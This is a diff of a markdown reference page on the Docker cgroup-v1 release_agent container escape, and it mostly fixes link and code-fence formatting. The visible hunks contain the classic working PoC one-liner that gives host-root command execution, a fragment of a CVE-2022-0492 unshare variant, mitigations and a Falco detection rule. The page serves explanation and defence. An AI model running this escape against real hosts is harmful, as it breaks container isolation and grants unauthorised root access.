@@ -1,20 +1,19 @@
 # Docker release_agent cgroups escape
 
-
-**For further details, refer to the** [[https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/|**original blog post**]]**.** This is just a summary:
+**For further details, refer to the** [**original blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** This is just a summary:
 
 ---
 
 ## Classic PoC (2019)
 
 ```shell
-d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)
+d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
-t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
+t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
 $1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
-```
+
 The PoC abuses the **cgroup-v1** `release_agent` feature: when the last task of a cgroup that has `notify_on_release=1` exits, the kernel (in the **initial namespaces on the host**) executes the program whose pathname is stored in the writable file `release_agent`.  Because that execution happens with **full root privileges on the host**, gaining write access to the file is enough for a container escape.
 
 ### Short, readable walk-through
@@ -82,7 +81,7 @@ unshare -UrCm sh -c '
   while true; do sleep 1; done
 '
 ```
-```If the kernel is vulnerable the busybox binary from the *host* executes with full root.
+If the kernel is vulnerable the busybox binary from the *host* executes with full root.
 
 ### Hardening & Mitigations
 
@@ -114,11 +113,11 @@ unshare -UrCm sh -c '
   priority: CRITICAL
   tags: [container, privilege_escalation]
 ```
-```
+
 The rule triggers on any write attempt to `*/release_agent` from a process inside a container that still wields `CAP_SYS_ADMIN`.
 
 ## References
 
-* [[https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/|Unit 42 – CVE-2022-0492: container escape via cgroups]] – detailed analysis and mitigation script.
-* [[https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/|Sysdig Falco rule & detection guide]]
+* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – detailed analysis and mitigation script.
+* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)
 
